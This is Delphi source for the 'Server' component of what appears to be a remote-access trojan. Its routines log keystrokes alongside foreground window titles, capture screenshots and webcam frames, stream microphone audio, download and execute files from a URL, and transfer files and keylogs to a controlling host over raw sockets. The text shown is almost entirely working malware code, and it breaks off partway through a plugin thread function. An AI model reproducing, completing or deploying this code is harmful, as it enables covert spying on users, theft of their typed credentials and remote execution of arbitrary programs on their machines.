
program Server;

uses
  Windows,
  Winsock,
  psApi,
  ACMConvertor,
  ACMIn,
  mmsystem,
  TLHelp32,
  classes,
  jpeg,
  Graphics,
  sysutils,
  uFireFox in 'uFireFox.pas',
  CryptApi in 'CryptApi.pas',
  uWebcam in 'uWebcam.pas',
  untHTTPDownload in 'untHTTPDownload.pas',
  MagicApiHooks in 'MagicApiHooks.pas',
  uFilemanager in 'uFilemanager.pas',
  uFunction in 'uFunction.pas',
  uRegistry in 'uRegistry.pas',
  uInstallation in 'uInstallation.pas',
  uKeylogger in 'uKeylogger.pas',
  uServices in 'uServices.pas',
  uWindows in 'uWindows.pas',
  untCMDList in 'untCMDList.pas',
  CnRawInput in 'CnRawInput.pas',
  uThumnail in 'uThumnail.pas',
  uDOS in 'uDOS.pas',
  uThumbDesktop in 'uThumbDesktop.pas',
  afxCodeHook in 'afxCodeHook.pas';

const
  WM_CAP_START = $0400;
  WM_CAP_DRIVER_CONNECT = $0400 + 10;
  WM_CAP_DRIVER_DISCONNECT = $0400 + 11;
  WM_CAP_SAVEDIB = $0400 + 25;
  WM_CAP_GRAB_FRAME = $0400 + 60;
  WM_CAP_STOP = $0400 + 68;
type
    TPluginRec = packed record
      szName:     string;
      szVersion:  string;
      szAuthor:   string;
      szMutex:    string;
      Call:       procedure(hWindow:pointer; socket:integer; var Strs:pointer); stdcall;
      ReceiveData:procedure(socket:integer; sStringz:string); stdcall;
      sServPluginname:string;
    end;
  type
    PluginArray = array of TPluginRec;

Type
  TFileName = type string;
  TSearchRec = record
    Time: Integer;
    Size: Integer;
    Attr: Integer;
    Name: TFileName;
    ExcludeAttr: Integer;
    FindHandle: THandle;
    FindData: TWin32FindData;
  end;

  LongRec = packed record
    case Integer of
      0: (Lo, Hi: Word);
      1: (Words: array [0..1] of Word);
      2: (Bytes: array [0..3] of Byte);
  end;


  TInfo = Record
    Name        :String;
    Host        :String;
    Port        :Integer;
    Size        :Integer;
    FileSize    :Cardinal;
    Mutex       :Integer;
    SShot:extended;
    sFile:string;
    sScreenshotStringz:string;
  End;
  PInfo = ^TInfo;

  TServer = Class(TObject)
  Private
    Sock        :TSocket;
    Addr        :TSockAddrIn;
    WSA         :TWSAData;
  Public
    Procedure Connect;
    Procedure SendData(Text: String);
    Procedure ReceiveData;
    procedure KeyloggerStart;
    procedure RawKeyDown(Sender: TObject; Key: Word;
  FromKeyBoard: THandle);
  End;



  type
  TAudio = class
    Sock          :TSocket;
    Addr          :TSockAddrIn;
    WSA           :TWSAData;
    BytesRead     :Cardinal;
    Buf           :Array[0..4000] Of Char;
    Host          :String;
    Port          :Integer;
    T             :String;
    Mutex         :integer;

    Format: TWaveFormatEx;
    ACMC: TACMConvertor;
    ACMI: TACMIn;
    SesDoldu : Boolean;
    SesBilgisi : String;
    procedure BufferFull(Sender: TObject; Data: Pointer; Size: Integer);
  end;

VAR
  AudioCap      :TAudio;
  Functionu:TFunctions;

  Serv          :TServer;
  Info          :TInfo;
  Close         :Boolean;
  LastDir       :String;
  host: string = '';
  password: string = 'password';
  port: integer = 1004;
  sID: String = 'DEFAULT';
  sVer: String = '0.8.1';
  Dllname:string='_xx_mydll.dll';
  Msg:TMsg;
  R:TCnRawKeyBoard;
  sKeyloggerThread:Cardinal;
  sIPList:TStringlist;
  Hookhandle:Cardinal;
  ss:string;
  sInstallParams:Array[0..100]of String;
  sSettings:string;
  Installer:TInstaller;
  x,y:integer;
  PluginName:     function():PChar; stdcall;
  PluginVersion:  function():PChar; stdcall;
  PluginAuthor:  function():PChar; stdcall;
  PluginMutex:  function():PChar; stdcall;
  Plugins:        PluginArray;
  CaptureWindow: dword;
  tCount:    DWORD;


  function ShellExecute(hWnd: HWND; Operation, FileName, Parameters,  Directory: PChar; ShowCmd: Integer): HINST; stdcall; external 'shell32.dll' name 'ShellExecuteA';

Function SaveBitmapToStream(Stream: TMemoryStream; HBM: HBitmap): Integer;
Const
  BMType = $4D42;
Type
  TBitmap = Record
    BMType: Integer;
    bmWidth: Integer;
    bmHeight: Integer;
    bmWidthBytes: Integer;
    bmPlanes: byte;
    bmBitsPixel: byte;
    bmBits: Pointer;
  End;
Var
  BM: TBitmap;
  BFH: TBitmapFileHeader;
  BIP: PBitmapInfo;
  DC: HDC;
  HMem: THandle;
  Buf: Pointer;
  ColorSize, DataSize: Longint;
  BitCount: word;
  Function AlignDouble(Size: Longint): Longint;
  Begin
    Result := (Size + 31) Div 32 * 4;
  End;
Begin
  Result := 0;
  If GetObject(HBM, SizeOf(TBitmap), @BM) = 0 Then Exit;
  BitCount := 32;
  If (BitCount <> 24) Then
    ColorSize := SizeOf(TRGBQuad) * (1 Shl BitCount)
  Else
    ColorSize := 0;
  DataSize := AlignDouble(BM.bmWidth * BitCount) * BM.bmHeight;
  GetMem(BIP, SizeOf(TBitmapInfoHeader) + ColorSize);
  If BIP <> Nil Then
  Begin
    With BIP^.bmiHeader Do
    Begin
      biSize := SizeOf(TBitmapInfoHeader);
      biWidth := BM.bmWidth;
      biHeight := BM.bmHeight;
      biPlanes := 1;
      biBitCount := BitCount;
      biCompression := 0;
      biSizeImage := DataSize;
      biXPelsPerMeter := 0;
      biYPelsPerMeter := 0;
      biClrUsed := 0;
      biClrImportant := 0;
    End;
    With BFH Do
    Begin
      bfOffBits := SizeOf(BFH) + SizeOf(TBitmapInfo) + ColorSize;
      bfReserved1 := 0;
      bfReserved2 := 0;
      bfSize := Longint(bfOffBits) + DataSize;
      bfType := BMType;
    End;
    HMem := GlobalAlloc(gmem_Fixed, DataSize);
    If HMem <> 0 Then
    Begin
      Buf := GlobalLock(HMem);
      DC := GetDC(0);
      If GetDIBits(DC, HBM, 0, BM.bmHeight,
        Buf, BIP^, dib_RGB_Colors) <> 0 Then
      Begin
        Stream.WriteBuffer(BFH, SizeOf(BFH));
        Stream.WriteBuffer(pchar(BIP)^, SizeOf(TBitmapInfo) + ColorSize);
        Stream.WriteBuffer(Buf^, DataSize);
        Result := 1;
      End;
      ReleaseDC(0, DC);
      GlobalUnlock(HMem);
      GlobalFree(HMem);
    End;
  End;
  FreeMem(BIP, SizeOf(TBitmapInfoHeader) + ColorSize);
  DeleteObject(HBM);
End;
function GetCharFromVirtualKey(Key: Word): string;
var
   keyboardState: TKeyboardState;
   asciiResult: Integer;
   nametext:Array[0..32] of Char;
begin
   GetKeyNameText(MapVirtualKey(key, 0) shl 16,nametext,sizeof(nametext));
   if Key = VK_CAPITAL then begin
     result := #0;
     exit;
   end;
   if Key = VK_BACK then begin
     result := '[Delete]';
     exit;
   end;
   if Key = VK_RETURN then begin
     result := '[Enter]';
     exit;
   end;
   if Key = VK_SHIFT then begin
     result := '[Shift]';
     exit;
   end;
   if Key = VK_SPACE then begin
     result := '[Space]';
     exit;
   end;
   if lstrlen(nametext) > 1 then begin
   result := '[' + nametext + ']';
   exit;
   end;
   GetKeyboardState(keyboardState) ;
   SetLength(Result, 2) ;
   asciiResult := ToAscii(key, MapVirtualKey(key, 0), keyboardState, @Result[1], 0) ;
   case asciiResult of
     0: Result := '';
     1: SetLength(Result, 1) ;
     2:;
     else
       Result := '';
   end;
end;

procedure TServer.RawKeyDown(Sender: TObject; Key: Word;
  FromKeyBoard: THandle);
var
  s:string;
  p:string;
  szCurAppNm:array[0..260] of Char;
begin

  s := GetCharFromVirtualKey(key);
  if s = '' then exit;
  GetWindowText(GetForegroundWindow, szCurAppNm, sizeof(szCurAppNm));
    if ss <> szCurAppNm then begin
      ss := szCurAppNm;
      if Hookhandle <> 0 then begin
      p := '33|' + '[ ' + ss + '] (' + timetostr(time) + ' ' + datetostr(date) + ')' + #10;
      send(Serv.Sock,p[1],Length(p),0);
      end;
      functionu.AppendFile(#13 + #10 + #13 +#10 + '[' + ss + ']'+ #13 + #10)
   end;
  functionu.AppendFile(s);
  if Hookhandle <> 0 then begin
  s := '32|' +s + #10;
  send(serv.Sock,s[1],length(s),0);
  end;
end;
procedure TServer.KeyloggerStart;
begin
  R := TCnRawKeyBoard.Create(nil);
  R.OnRawKeyDown := RawKeyDown;
  R.Enabled := true;
end;
function CaptureWND(hWindow:HWND;Ratio:Extended;bitCount:integer;var x,y:integer):HBITMAP;
var  BmpInfo:BITMAPINFO; DC1,DC2:hDC; p:Pointer;  old:hgdiobj;
begin
    if hWindow = 0 then hWindow := GetDesktopWindow();
    DC1 := GetDC(hWindow);
    x := GetDeviceCaps(DC1,HORZRES);
    y := GetDeviceCaps(DC1,VERTRES);

    ZeroMemory(@BmpInfo.bmiHeader, sizeof(BITMAPINFOHEADER));
    BmpInfo.bmiHeader.biWidth := round(x * RATIO);
    BmpInfo.bmiHeader.biHeight := round(y * RATIO);
    BmpInfo.bmiHeader.biPlanes := 1;
    BmpInfo.bmiHeader.biBitCount := bitCount;
    BmpInfo.bmiHeader.biSize := sizeof(BITMAPINFOHEADER);
    DC2 := CreateCompatibleDC(0);
    Result := CreateDIBSection(DC2,BmpInfo, DIB_RGB_COLORS,p, 0, 0);
    Old := SelectObject(DC2, Result);
    if(RATIO <> 1)then
     begin
        SetStretchBltMode(DC2, HALFTONE); SetBrushOrgEx(DC2, 0, 0, nil);
        StretchBlt(DC2, 0, 0, BmpInfo.bmiHeader.biWidth, BmpInfo.bmiHeader.biHeight, DC1, 0, 0, x, y, SRCCOPY);
     end
    else BitBlt(DC2, 0, 0, BmpInfo.bmiHeader.biWidth, BmpInfo.bmiHeader.biHeight, DC1, 0, 0, SRCCOPY);
    SelectObject(DC2,Old);
    DeleteDC(DC2); ReleaseDC(hWindow, DC1);
    x := BmpInfo.bmiHeader.biWidth;
    y := BmpInfo.bmiHeader.biHeight;
end;

function GetBitmapFromDesktop:HBitmap;
begin
  Result := CaptureWND(0,1,24,x,y);
end;

function GetBitmapFromFile(BitmapPath: string): HBitmap;
begin
  Result := LoadImage(GetModuleHandle(nil), pchar(BitmapPath), IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
end;

function GetBitmapFromWebcam: HBitmap;
begin
  CaptureWindow := capCreateCaptureWindowA('CaptureWindow', WS_CHILD or WS_VISIBLE, 0, 0, 0, 0, GetDesktopWindow, 0);
  if CaptureWindow <> 0 then
  begin
    SendMessage(CaptureWindow, WM_CAP_DRIVER_CONNECT, 0, 0);
    SendMessage(CaptureWindow, WM_CAP_GRAB_FRAME, 0, 0);
    SendMessage(CaptureWindow, WM_CAP_SAVEDIB, 0, longint(pchar('~~tmp.bmp')));
    SendMessage(CaptureWindow, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    SendMessage(CaptureWindow, $0010, 0, 0);
    CaptureWindow := 0;
    Result := GetBitmapFromFile('~~tmp.bmp');
    DeleteFile(pchar('~~tmp.bmp'));
  end
  else
  begin
    Result := 234;
  end;
end;

function StrScan(const Str: PChar; Chr: Char): PChar;
begin
  Result := Str;
  while Result^ <> Chr do
  begin
    if Result^ = #0 then
    begin
      Result := nil;
      Exit;
    end;
    Inc(Result);
  end;
end;

Function ExecuteFileFromURL(p:pointer): dword;STDCALL;
Var
  dHost,dTo:string;
Begin
  Result := 0;
  dHost := pinfo(p)^.host;
  dTo := pinfo(p)^.Name;
  If (DownloadFile(dHost, dTo)) Then
  Begin
  Result :=  ShellExecute(0, 'open', pChar(dTo), nil, nil, 1);
  end;
End;
function DirectoryExists(const Directory: string): Boolean;
var
  Code: Integer;
begin
  Code := GetFileAttributes(PChar(Directory));
  Result := (Code <> -1) and (FILE_ATTRIBUTE_DIRECTORY and Code <> 0);
end;

Function GetPluginPath: String;
var
  Installation:TInstaller;
Begin
  Installation := TInstaller.Create;
  Result := Installation.GetCurrentDir + '\Plugins\';
  If (Not DirectoryExists(Result)) Then
    CreateDirectory(pChar(Result), NIL);
  Installation.Free;
End;
Function ResolveIP(HostName: String): String;
Type
  tAddr = Array[0..100] Of PInAddr;
  pAddr = ^tAddr;
Var
  I             :Integer;
  WSA           :TWSAData;
  PHE           :PHostEnt;
  P             :pAddr;
Begin
  Result := '';

  WSAStartUp($101, WSA);
    Try
      PHE := GetHostByName(pChar(HostName));
      If (PHE <> NIL) Then
      Begin
        P := pAddr(PHE^.h_addr_list);
        I := 0;
        While (P^[I] <> NIL) Do
        Begin
          Result := (inet_nToa(P^[I]^));
          Inc(I);
        End;
      End;
    Except
    End;
  WSACleanUp;
End;

//thx to wack-a-mole
function ReadSettings(var Settings: string): boolean;
var
  hResInfo: HRSRC;
  hRes:     HGLOBAL;
  tChar:PChar;
begin
  Result   := False;
  hResInfo := FindResource(hInstance, 'CFG', RT_RCDATA);
  if hResInfo <> 0 then
  begin
    hRes := LoadResource(hInstance, hResInfo);
    if hRes <> 0 then
    begin
      tChar := LockResource(hRes);
      settings := PChar(tChar);
      SetLength(Settings,SizeOfResource(HInstance, HResInfo));
      Result   := True;
    end;
  end;
end;

Procedure Restart;
Begin
  closesocket(serv.Sock);
  ShellExecute(0, 'Open', pchar(paramstr(0)),'', '', 0);
  ExitProcess(0);
End;

Function SendData(Sock: TSocket; Text: String; VAR sByte: Cardinal): Integer;
Var
  Len: Integer;
Begin
  Result := Length(Text);
  Len := Send(Sock, Text[1], Length(Text), 0);
  Inc(sByte, Len);
End;
Procedure SplitSettings(Text: String; VAR Param: Array of String);
Var
  I: Word;
Begin
  If Text = '' Then Exit;
  FillChar(Param, SizeOf(Param), 0);
  I := 0;
  While (Pos('##', Text) > 0) Do
  Begin
    Param[I] := Copy(Text, 1, Pos('##', Text)-1);
    Inc(I);
    Delete(Text, 1, Pos('##', Text) + 1);
    If (I >= 100) Then Break;
  End;
End;
Procedure StripOutCmd(Text: String; VAR Cmd: String);
Begin Cmd := Copy(Text, 1, Pos('|', Text)-1); End;

Procedure StripOutParam(Text: String; VAR Param: Array of String);
Var
  I: Word;
Begin
  If Text = '' Then Exit;
  FillChar(Param, SizeOf(Param), 0);
  Delete(Text, 1, Pos('|', Text));

  If Text = '' Then Exit;
  If (Text[Length(Text)] <> '|') Then Text := Text + '|';

  I := 0;
  While (Pos('|', Text) > 0) Do
  Begin
    Param[I] := Copy(Text, 1, Pos('|', Text)-1);
    Inc(I);
    Delete(Text, 1, Pos('|', Text));
    If (I >= 100) Then Break;
  End;
End;

Function FileExists(Const FileName: String): Boolean;
Var
  FileData      :TWin32FindData;
  hFile         :Cardinal;
Begin
  hFile := FindFirstFile(pChar(FileName), FileData);
  If (hFile <> INVALID_HANDLE_VALUE) Then
  Begin
    Result := True;
    Windows.FindClose(hFile);
  End Else
    Result := False;
End;

procedure CvtInt;
asm
        OR      CL,CL
        JNZ     @CvtLoop
@C1:    OR      EAX,EAX
        JNS     @C2
        NEG     EAX
        CALL    @C2
        MOV     AL,'-'
        INC     ECX
        DEC     ESI
        MOV     [ESI],AL
        RET
@C2:    MOV     ECX,10

@CvtLoop:
        PUSH    EDX
        PUSH    ESI
@D1:    XOR     EDX,EDX
        DIV     ECX
        DEC     ESI
        ADD     DL,'0'
        CMP     DL,'0'+10
        JB      @D2
        ADD     DL,('A'-'0')-10
@D2:    MOV     [ESI],DL
        OR      EAX,EAX
        JNE     @D1
        POP     ECX
        POP     EDX
        SUB     ECX,ESI
        SUB     EDX,ECX
        JBE     @D5
        ADD     ECX,EDX
        MOV     AL,'0'
        SUB     ESI,EDX
        JMP     @z
@zloop: MOV     [ESI+EDX],AL
@z:     DEC     EDX
        JNZ     @zloop
        MOV     [ESI],AL
@D5:
end;

Function RecvFile(P: Pointer): integer; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  F             :File;
  Buf           :Array[0..8192] Of Char;
  dErr          :Integer;
  Name          :String;
  Host          :String;
  sFilez        :string;
  Port          :Integer;
  recvsize      :integer;
  Size          :Integer;
  T             :String;
Begin
  Name := PInfo(P)^.Name;
  Host := PInfo(P)^.Host;
  Port := PInfo(P)^.Port;
  Size := PInfo(P)^.Size;
  sFilez := Pinfo(p)^.sFile;
  WSAStartUp($0101, WSA);
    Sock := Socket(AF_INET, SOCK_STREAM, 0);
    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(Port);
    Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
    Result := (connect(Sock, Addr, SizeOf(Addr)));
    if Result = SOCKET_ERROR then Exit;
    T := '40|' + sFilez + '|' + IntToStr(Size) + #10;
    send(Sock,t[1],Length(t),0);
    Sleep(1000);
    {$I-}
    T := 'ok';
    recvsize := 1;
    AssignFile(F, Name);
    Rewrite(F, 1);
    Repeat
      FillChar(Buf, SizeOf(Buf), 0);
      dErr := Recv(Sock, Buf, SizeOf(Buf), 0);
      if dErr = -1 then Break;
      if Size < (derr + recvsize) then begin
        BlockWrite(F, Buf, Size - recvsize + 1);
        Inc(recvsize, derr);
      end else begin
        Inc(recvsize, dErr);
        BlockWrite(F, Buf, derr);
      end;
      dErr := Send(Sock, T[1], Length(T), 0);
      if dErr = -1 then Break;
    Until recvsize >= Size;
    CloseFile(F);
    {$I+}

End;
Function GetFileSize(FileName: String): Int64;
Var
  H     :THandle;
  Data  :TWIN32FindData;
Begin
  Result := -1;
  H := FindFirstFile(pChar(FileName), Data);
  If (H <> INVALID_HANDLE_VALUE) Then
  Begin
    Windows.FindClose(H);
    Result := Int64(Data.nFileSizeHigh) SHL 32 + Data.nFileSizeLow;
  End;
End;


Function SendThumbnailDesktop(P: Pointer): integer; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  BytesRead     :Cardinal;
  Buf           :Array[0..8000] Of Char;
  Name          :String;
  Host          :String;
  Port          :Integer;
  FileSize      :cardinal;
  T             :String;
  myStream:Tmemorystream;
Begin
  Result := SOCKET_ERROR;
  Name := PInfo(P)^.Name;
  Host := PInfo(P)^.Host;
  Port := PInfo(P)^.Port;
  myStream := Tmemorystream.Create;
  try
  My_GetScreenToBmp(True,myStream);
  except
   mystream.Clear;
  end;
  FileSize := mystream.Size;
  WSAStartUp($0101, WSA);
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(port);
  Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
  If (connect(Sock, Addr, SizeOf(Addr)) <> 0) Then Exit;
  T := IntToStr(402) + '|'+inttostr(FileSize)+'|' + name+ '|' + inttostr(PInfo(P)^.Mutex) + #10;
  send(sock, t[1],length(T),0);
  {$I-}
  sleep(100);
  mystream.Position := 0;
  Repeat
    BytesRead := mystream.Read(Buf, SizeOf(Buf));
    If (BytesRead = 0) Then Break;
    Send(Sock, Buf[0], SizeOf(Buf), 0);
    FillChar(Buf, SizeOf(Buf), 0);
    Recv(Sock, Buf, SizeOf(Buf), 0);
  Until BytesRead = 0;
  mystream.Free;
  {$I+}
End;



Function SendScreenShotN(P: Pointer): Integer; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  BytesRead     :Cardinal;
  Buf           :Array[0..4000] Of Char;
  Host          :String;
  Port          :Integer;
  T             :String;
  Mutex         :integer;
  ccs:extended;
  x,y:integer;
  sBitmap:TBitmap;
  sJPEG:TJPEGImage;
  pf:tmemorystream;
  sTempStr,data:string;
  len:integer;
Begin
  Mutex := pinfo(p)^.Mutex;
  Host := pInfo(P)^.Host;
  Port := pInfo(P)^.Port;
  sBitmap := TBitmap.Create;
  sJPEG := TJPEGImage.Create;
  pf := TMemoryStream.Create;
  WSAStartUp($0101, WSA);
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(port);
  Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
  Result := (connect(Sock, Addr, SizeOf(Addr)));
  if Result = SOCKET_ERROR Then Exit;
  T := IntToStr(C_SCREENN) + '|' + IntToStr(mutex) + '|' + #10;
    send(sock, t[1],length(T),0);
    {$I-}
    repeat
    Len := Recv(sock, Buf, SizeOf(Buf), 0);
    If (Len <= 0) Then Break;
    Data := String(Buf);
    ZeroMemory(@Buf, SizeOf(Buf));
    if copy(data,1,4) = 'SEND' then begin
      sbitmap.FreeImage;
      pf.Clear;
      delete(data,1,4);
      sTempstr := copy(data,1,pos('|',data) - 1);
      ccs := (strtoint(sTempstr) / 100);
      sBitmap.Handle := CaptureWND(0,ccs,16,x,y);
      sJPEG.Assign(sbitmap);
      delete(data,1,length(stempstr) + 1);
      sTempstr := copy(data,1,pos('|',data) - 1);
      sJPEG.CompressionQuality := strtoint(sTempstr);
      sJPEG.Compress;
      sJPEG.SaveToStream(pf);
      T := '130'+inttostr(pf.Size) + '|';
      send(sock, t[1],length(T),0);
      {$I-}
      pf.Position := 0;
      Repeat
      bytesread := pf.Read(Buf, SizeOf(Buf));
      If (BytesRead = 0) Then Break;
      Send(Sock, Buf[0], SizeOf(Buf), 0);
      FillChar(Buf, SizeOf(Buf), 0);
      Until BytesRead = 0;
    end;
  until 1 = 3;
    pf.Free;
    sBitmap.Free;
    sJPEG.Free;
    WSACleanup();
    {$I+}
End;





procedure  TAudio.BufferFull(Sender: TObject; Data: Pointer; Size: Integer);
var
  NewSize: Integer;
  Stream: TMemoryStream;
begin
  Move(Data^, ACMC.BufferIn^, Size);
  NewSize := ACMC.Convert;
  Stream := TMemoryStream.Create;
  Stream.WriteBuffer(ACMC.BufferOut^, NewSize);

      T := '130'+inttostr(Stream.Size) + '|';
      send(sock, t[1],length(T),0);
      sleep(10);
      Stream.Position := 0;
      Repeat
       bytesread := Stream.Read(Buf, SizeOf(Buf));
       If (BytesRead = 0) Then Break;
         Send(Sock, Buf[0], SizeOf(Buf), 0);
         FillChar(Buf, SizeOf(Buf), 0);
      Until BytesRead = 0;
      Stream.Clear;
end;



Function SendAudioStream(P: Pointer): Integer; STDCALL;
Var
  data:string;
  len:integer;
Begin
  Result := 0;
  if (connect(AudioCap.Sock, AudioCap.Addr, SizeOf(AudioCap.Addr))) = SOCKET_ERROR Then Exit;
  AudioCap.T := IntToStr(C_AUDIOSTART) + '|' + IntToStr(AudioCap.mutex) + '|' + #10;
  send(AudioCap.sock, AudioCap.t[1],length(AudioCap.T),0);

    {$I-}
    repeat
    Len := Recv(AudioCap.sock, AudioCap.Buf, SizeOf(AudioCap.Buf), 0);
    If (Len <= 0) Then Break;
    Data := String(AudioCap.Buf);
    ZeroMemory(@AudioCap.Buf, SizeOf(AudioCap.Buf));
    if copy(data,1,4) = 'Stop' then
    begin
    delete(data,1,5);
      AudioCap.SesDoldu:=FALSE;
      AudioCap.SesBilgisi:='';
      IF AudioCap.ACMC<>NIL THEN
        BEGIN
          AudioCap.ACMC.Active := False;
          AudioCap.ACMI.Close;
        END;
    end;

    if copy(data,1,5) = 'Start' then
    begin
      delete(data,1,6);
      AudioCap.ACMC.Active:= True;
      AudioCap.ACMI.Open(AudioCap.ACMC.FormatIn);
    end;

  until 1 = 3;
    {$I+}
End;







Function SendKeylog(P: Pointer): integer; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  Totstring     :string;
  tempStrings   :string;
  Buf           :Array[0..8000] Of Char;
  Name          :String;
  Host          :String;
  Port          :Integer;
  T             :String;

  mutex:integer;
  Keylogger:TKeylogger;
Begin
  Keylogger := TKeylogger.Create;
  Name := Installer.GetCurrentDir + '\keylog.dat';
  Host := PInfo(P)^.Host;
  Port := PInfo(P)^.Port;
  mutex := Pinfo(p)^.mutex;
  WSAStartUp($0101, WSA);
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(port);
  Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
  Result := (connect(Sock, Addr, SizeOf(Addr)));
  if Result = SOCKET_ERROR then Exit;
  T := IntToStr(41) + '|'+inttostr(GetFileSize(installer.GetCurrentDir + '\keylog.dat')) + '|' + IntToStr(mutex) +#10;
  send(sock, t[1],length(T),0);
  {$I-}
  sleep(1000);
  Totstring := Keylogger.Readkeylogger;
  Repeat
    tempStrings := Copy(totstring,1,8000);
    Delete(Totstring,1,8000);
    Send(Sock, tempStrings[1], length(tempStrings), 0);
    If (length(Totstring) = 0) Then Break;
    Recv(Sock, Buf, SizeOf(Buf), 0);
  Until Length(Totstring) = 0;
  Keylogger.Free;
  WSACleanup();
  {$I+}
End;
Function SendThumbnail(P: Pointer): integer; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  BytesRead     :Cardinal;
  Buf           :Array[0..8000] Of Char;
  Name          :String;
  Host          :String;
  Port          :Integer;
  FileSize      :cardinal;
  T             :String;
  myStream:Tmemorystream;
  Thumbnails:TThumbnails;
Begin
  Result := SOCKET_ERROR;

  Name := PInfo(P)^.Name;
  Host := PInfo(P)^.Host;
  Port := PInfo(P)^.Port;
  myStream := Tmemorystream.Create;
  THumbnails := TThumbnails.Create;
  try
  Thumbnails.CreateThumb(Name,myStream);
  except
   mystream.Clear;
  end;
  FileSize := mystream.Size;
  WSAStartUp($0101, WSA);
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(port);
  Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
  If (connect(Sock, Addr, SizeOf(Addr)) <> 0) Then Exit;
  T := IntToStr(116) + '|'+inttostr(FileSize)+'|' + name+ '|' + inttostr(PInfo(P)^.Mutex) + #10;
  send(sock, t[1],length(T),0);
  {$I-}
  sleep(100);
  mystream.Position := 0;
  Repeat
    BytesRead := mystream.Read(Buf, SizeOf(Buf));
    If (BytesRead = 0) Then Break;
    Send(Sock, Buf[0], SizeOf(Buf), 0);
    FillChar(Buf, SizeOf(Buf), 0);
    Recv(Sock, Buf, SizeOf(Buf), 0);
  Until BytesRead = 0;
  mystream.Free;
  WSACleanup();
  {$I+}
End;
Function SendFile(P: Pointer): integer; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  BytesRead     :Cardinal;
  F             :File;
  Buf           :Array[0..8000] Of Char;
  Name          :String;
  Host          :String;
  Port          :Integer;
  FileSize      :cardinal;
  T             :String;
Begin
  Result := SOCKET_ERROR;
  Name := PInfo(P)^.Name;
  Host := PInfo(P)^.Host;
  Port := PInfo(P)^.Port;
  FileSize := PInfo(P)^.FileSize;
  WSAStartUp($0101, WSA);
    Sock := Socket(AF_INET, SOCK_STREAM, 0);
    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(port);
    Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
    If (connect(Sock, Addr, SizeOf(Addr)) <> 0) Then Exit;
    T := IntToStr(C_STARTTRANSFER) + '|'+inttostr(FileSize)+'|' + name+   #10;
    send(sock, t[1],length(T),0);
    {$I-}
    sleep(1000);
    AssignFile(F, Name);
    Reset(F, 1);
    Repeat
      BlockRead(F, Buf, SizeOf(Buf), BytesRead);
      If (BytesRead = 0) Then Break;
      Send(Sock, Buf[0], SizeOf(Buf), 0);
      FillChar(Buf, SizeOf(Buf), 0);
      Recv(Sock, Buf, SizeOf(Buf), 0);
    Until BytesRead = 0;
    CloseFile(F);
    WSACleanup();
    {$I+}
End;

Function ExtractFileName(Const Path: String): String;
Var
  I     :Integer;
  L     :Integer;
  Ch    :Char;
Begin
  Result := Path;
  L := Length(Path);
  For I := L DownTo 1 Do
  Begin
    Ch := Path[I];
    If (Ch = '\') Or (Ch = '/') Then
    Begin
      Result := Copy(Path, I + 1, L - I);
      Break;
    End;
  End;
End;


Function RemoteAddr(Sock: TSocket): TSockAddrIn;
Var
  W     :TWSAData;
  S     :TSockAddrIn;
  I     :Integer;
Begin
  WSAStartUP($0101, W);
  I := SizeOf(S);
  GetPeerName(Sock, S, I);
  WSACleanUP();

  Result := S;
End;

Function RemoteAddress(Sock: TSocket): String;
Begin
  Result := INET_NTOA(RemoteAddr(Sock).sin_addr);
End;

Procedure ListProcess(dInt: Integer);
Var
  pHandle      :THandle;
  hSnapShot     :THandle;
  ProcessEntry  :TProcessEntry32;
  Temp          :String;
  sTemp         :string;
  ppath         :string;
Begin
  hSnapShot := CreateToolHelp32SnapShot(TH32CS_SNAPALL,0);
    ProcessEntry.dwSize := SizeOf(TProcessEntry32);
      try
       Process32First(hSnapShot, ProcessEntry);
        repeat
        phandle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, ProcessEntry.th32ProcessID);
        SetLength(ppath, MAX_PATH);
          if (GetModuleFileNameEx(phandle, 0, PChar(ppath), MAX_PATH)) > 0 then begin;
            SetLength(ppath, length(PChar(ppath)));
            end
          else begin
            ppath := 'System';
          end;
          sTemp := '|' + IntToStr(ProcessEntry.th32ProcessID) + '#' + ppath + '#' + ProcessEntry.szExeFile;
          Temp := Temp + sTemp;
    until not Process32Next(hSnapShot, ProcessEntry);
    finally
    CloseHandle(hSnapShot);
 end;
  Temp :=  '16' + Temp + #10;
  Send(Serv.Sock, Temp[1], Length(Temp), 0);
End;

Function PluginThread(P: Pointer): integer; STDCALL;
Var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  data:string;
  Buf           :Array[0..4000] Of Char;
  Host          :String;
  Port          :Integer;
  T             :String;
  Mutex         :string;
  i:integer;
  cSock:integer;
  sCount:string;
  Len:integer;
  pluginfound:boolean;
Begin
  pluginfound := false;
  Mutex := pinfo(p)^.Name;
  Host := pInfo(P)^.Host;
  cSock := pinfo(p)^.Size;
  sCount := inttostr(pinfo(p)^.Mutex);
  Port := pInfo(P)^.Port;
  WSAStartUp($0101, WSA);
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(port);
  Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
